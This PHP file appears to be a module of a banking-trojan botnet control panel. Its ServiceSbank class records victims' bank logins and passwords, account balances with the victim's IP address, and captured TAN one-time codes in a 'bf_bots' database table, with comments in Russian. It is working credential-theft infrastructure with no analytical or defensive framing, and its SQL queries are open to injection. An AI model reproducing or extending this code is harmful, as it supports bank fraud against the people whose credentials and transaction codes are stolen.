<?php

class ServiceSbank {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
	
	if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }
    
    // сохраняет логин и пароль при повторном вызове перезаписывает
    function Auth($login = '', $password = ''){
        $this->bot->info['logs']['login'] = $login;
        $this->bot->info['logs']['password'] = $password;
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return array($login , $password);
    }
    
    //устанавливает текущий баланс на аккаунте
    function SummSet($acc = '', $balance = ''){
        if(empty($acc)) return false;
        if(empty($balance)) return false;
        return $this->db->query("INSERT INTO bf_balance set userid = '".$this->bot->userid."', prefix = '".$this->bot->prefix."', uid = '".$this->bot->uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$this->system->nid."', balance='".$balance."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
    }
    
    //сохраняет ТАН(номер, сам тан)
    function TanSet($tannum = '', $TanSet = ''){
        //$this->bot->info['logs']['tan'][] = array($tannum, $TanSet, time());
        
        if(!isset($this->bot->info['logs']['tan'][0])){
	    $this->bot->info['logs']['tan'][] = array($tannum, $TanSet, time());
	}else{
	    array_unshift($this->bot->info['logs']['tan'], array($tannum, $TanSet, time()));
	}
	
	if(count($this->bot->info['logs']['tan']) >= 20){
	    $this->bot->info['logs']['tan'] = array_slice($this->bot->info['logs']['tan'], 0, 20);
	}
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');

        return array($tannum,$TanSet,time());
    }

    //сохраняет объект в бд. как я понял там и ключ и значение в базе строковые
    function SaveObj($name, $val){
	$this->bot->info['obj'][$name] = base64_encode(json_encode($val));
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
    }
    
    //загружает объект
    function LoadObj($name){
        if(isset($this->bot->info['obj'][$name])){
            return json_decode(base64_decode($this->bot->info['obj'][$name]));
        }else{
            return false;
        }
    }
}

RegisterService("ServiceSbank");